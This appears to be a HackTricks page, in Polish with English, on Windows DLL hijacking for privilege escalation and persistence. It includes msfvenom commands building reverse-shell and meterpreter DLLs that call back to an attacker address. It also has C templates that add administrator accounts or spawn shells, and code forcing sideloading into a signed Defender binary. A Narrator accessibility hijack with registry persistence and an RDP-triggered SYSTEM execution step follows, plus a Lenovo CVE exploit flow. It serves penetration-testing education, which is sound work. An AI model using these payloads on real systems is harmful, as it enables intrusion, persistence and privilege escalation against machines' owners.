# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji tak, aby załadowała złośliwy DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Jest on głównie wykorzystywany do wykonania kodu, osiągnięcia persistence oraz, rzadziej, eskalacji uprawnień. Mimo że tutaj skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

Stosuje się kilka metod DLL hijackingu; ich skuteczność zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Podmiana oryginalnego DLL na złośliwy, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwego DLL w ścieżce wyszukiwania uprzedzającej oryginalny, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwego DLL, który aplikacja załaduje, myśląc, że to wymagany, nieistniejący DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak %PATH% lub pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastąpienie prawidłowego DLL złośliwym odpowiednikiem w katalogu WinSxS — metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwego DLL w katalogu kontrolowanym przez użytkownika razem z skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

## Finding missing Dlls

Najczęstszym sposobem znalezienia brakujących Dlls w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) ze sysinternals i ustawienie **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

oraz wyświetlenie tylko **Aktywności systemu plików**:

![](<../../../images/image (153).png>)

Jeśli szukasz **brakujących dlls ogólnie**, pozostaw to działające przez kilka **sekund**.\
Jeśli szukasz **brakującego dll** w konkretnym wykonywalnym pliku, powinieneś ustawić dodatkowy filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać przechwytywanie zdarzeń.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, najlepszą możliwością jest móc **zapisać DLL, który proces z podwyższonymi uprawnieniami spróbuje załadować** w miejscu, które będzie przeszukiwane. W ten sposób możemy zapisać DLL w folderze, który jest przeszukiwany **przed** folderem z **oryginalnym DLL** (dziwny przypadek), lub zapisać go w folderze, który będzie przeszukiwany, a oryginalny DLL nie istnieje w żadnym katalogu.

### Dll Search Order

W [dokumentacji Microsoft](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) możesz znaleźć szczegóły dotyczące tego, jak DLL są ładowane.

Aplikacje Windows szukają DLL, podążając za zestawem **zdefiniowanych ścieżek wyszukiwania**, przestrzegając określonej kolejności. Problem DLL hijackingu pojawia się, gdy złośliwy DLL zostanie strategicznie umieszczony w jednym z tych katalogów tak, że zostanie załadowany przed autentycznym DLL. Rozwiązaniem zapobiegającym temu jest zapewnienie, że aplikacja używa ścieżek absolutnych przy odwoływaniu się do wymaganego DLL.

Poniżej możesz zobaczyć **kolejność wyszukiwania DLL na systemach 32-bitowych**:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To jest **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Kiedy jest wyłączona, bieżący katalog awansuje na drugą pozycję. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie włączone).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zwróć uwagę, że **DLL może być załadowany wskazując ścieżkę absolutną zamiast samej nazwy**. W takim przypadku DLL będzie przeszukiwany **wyłącznie w tej ścieżce** (jeśli DLL ma zależności, będą one przeszukiwane tak, jakby były ładowane po nazwie).

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Dostarczając tutaj katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowany DLL po nazwie (bez ścieżki absolutnej i bez użycia flag bezpiecznego ładowania), może zostać zmuszony do załadowania złośliwego DLL z tego katalogu.

Kluczowy pomysł
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na kontrolowany przez ciebie folder (np. katalog, w którym znajduje się twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy binarka docelowa rozwiąże DLL po nazwie, loader uwzględni dostarczony DllPath podczas rozwiązywania, umożliwiając niezawodne sideloading nawet jeśli złośliwy DLL nie znajduje się obok docelowego EXE.

Uwaga/ograniczenia
- To wpływa na tworzony proces potomny; różni się to od SetDllDirectory, który wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki absolutnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths nie mogą być przechwycone. Forwarded exports i SxS mogą zmieniać priorytet.

Minimalny przykład w C (ntdll, wide strings, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub działający jako proxy do prawdziwego) w katalogu wskazanym przez DllPath.
- Uruchom podpisany plik wykonywalny, który według powyższej techniki wyszukuje xmllite.dll po nazwie. The loader rozwiązuje import za pomocą podanego DllPath i sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał pod **innymi uprawnieniami** (ruch poziomy lub lateralny), któremu **brakuje DLL**.
- Upewnij się, że masz **write access** do dowolnego **directory**, w którym **DLL** będzie **wyszukiwany**. Ta lokalizacja może być katalogiem pliku wykonywalnego lub katalogiem w system path.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie trudno znaleźć uprzywilejowany plik wykonywalny, któremu brakuje DLL** i jeszcze **trudniej mieć uprawnienia zapisu w folderze system path** (domyślnie nie możesz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.  
W przypadku, gdy masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **main goal of the project is bypass UAC**, możesz tam znaleźć **PoC** of a Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić importy pliku executable oraz eksporty dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby zapoznać się z pełnym przewodnikiem, jak **wykorzystać Dll Hijacking do eskalacji uprawnień** mając uprawnienia zapisu w **System Path folderze**, sprawdź:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w systemowym PATH.\
Inne interesujące zautomatyzowane narzędzia do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll_.

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy do skutecznego exploitowania będzie **utworzenie dll, która eksportuje przynajmniej wszystkie funkcje, które wykonywalny plik zaimportuje z niej**. Zauważ, że Dll Hijacking jest przydatny do [eskalacji z poziomu Medium Integrity do High **(omijając UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak stworzyć prawidłową dll** w tym studium dotyczącym dll hijacking skoncentrowanym na wykonaniu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Co więcej, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być użyteczne jako **szablony** lub do stworzenia **dll eksportującej nieobowiązkowe funkcje**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolna do **uruchomienia twojego złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** i **działania** zgodnie z oczekiwaniami poprzez **przekazywanie wszystkich wywołań do właściwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać plik wykonywalny i wybrać bibliotekę, którą chcesz proxify'ować, i wygenerować proxified dll, lub wskazać Dll i wygenerować proxified dll.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje

Zwróć uwagę, że w wielu przypadkach Dll, który skompilujesz, musi **export several functions**, które zostaną załadowane przez victim process. Jeśli tych funkcji zabraknie, **binary won't be able to load** them i **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład C++ DLL z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia w wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe wciąż próbuje załadować przewidywalny, specyficzny dla języka localization DLL przy uruchamianiu, który może zostać hijacked w celu arbitrary code execution i persistence.

Kluczowe fakty
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. Aby zachować ciszę, po attachu zenumeruj wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wywołaj `SuspendThread` na nim; kontynuuj w swoim wątku. Zobacz PoC dla pełnego kodu.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Dzięki powyższemu, uruchomienie Narrator załaduje podrzucony DLL. Na secure desktop (ekran logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się via RDP z hostem; na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator — Twój DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie przestaje działać po zamknięciu sesji RDP — inject/migrate szybko.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wbudowany wpis rejestru Accessibility Tool (AT) (np. CursorIndicator), edytować go, aby wskazywał na dowolny binary/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. To umożliwia proxy wykonania dowolnego kodu w ramach Accessibility framework.

Notes
- Zapisywaniem pod `%windir%\System32` i zmiana wartości w HKLM wymaga uprawnień administratora.
- Cała logika payloadu może żyć w `DLL_PROCESS_ATTACH`; nie są potrzebne żadne eksporty.

## Studium przypadku: CVE-2025-1729 - Privilege Escalation z użyciem TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w TrackPoint Quick Menu Lenovo (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.

### Szczegóły podatności

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako zwykły użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany w chwili wykonania zadania, złośliwy DLL uruchomi się w sesji administratora na poziomie medium integrity.
4. Uruchom standardowe UAC bypass techniques, aby podnieść uprawnienia z medium integrity do SYSTEM.

## Źródła

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)


{{#include ../../../banners/hacktricks-training.md}}
